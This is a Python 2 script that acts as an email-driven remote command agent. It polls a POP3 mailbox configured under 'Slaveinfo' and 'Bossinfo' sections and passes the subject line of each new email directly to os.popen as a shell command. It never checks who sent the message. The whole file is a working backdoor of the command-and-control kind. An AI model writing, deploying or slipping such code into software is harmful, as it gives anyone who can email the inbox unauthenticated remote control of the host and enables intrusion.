#!/usr/bin/python
# -*- coding: UTF-8 -*-

import poplib
import ConfigParser
import re
import time
import os


def get_config():
	global host, username, password,boss,timelimit
	config = ConfigParser.RawConfigParser()
	config.read("config.ini")
	host = config.get("Slaveinfo", "pop3host")
	username = config.get("Slaveinfo", "username")
	password = config.get("Slaveinfo", "password")
	boss = config.get("Bossinfo","bossuser")
	timelimit = config.get("Bossinfo","timelimit")


def main():
	global host, username, password,count
	rule = "\'Subject: (.*?)\'"
	config = ConfigParser.RawConfigParser()
	config.read("config.ini")
	pop = poplib.POP3(host)
	pop.user(username)
	pop.pass_(password)
	num, total_size = pop.stat()
	count = config.get("Slaveinfo", "count")
	if int(count) != num :
		config.set('Slaveinfo', 'count', num)
		config.write(open("config.ini", "w"))
		match_email = re.compile(rule)
		order = match_email.findall(str(pop.top(num,0)))
		print "The command is "+order[0]
		output = os.popen(order[0])
	else:
		print "New order maybe on the way!So be patiently wait for new command..."


get_config()
while (True):
	main()
	time.sleep(int(timelimit))
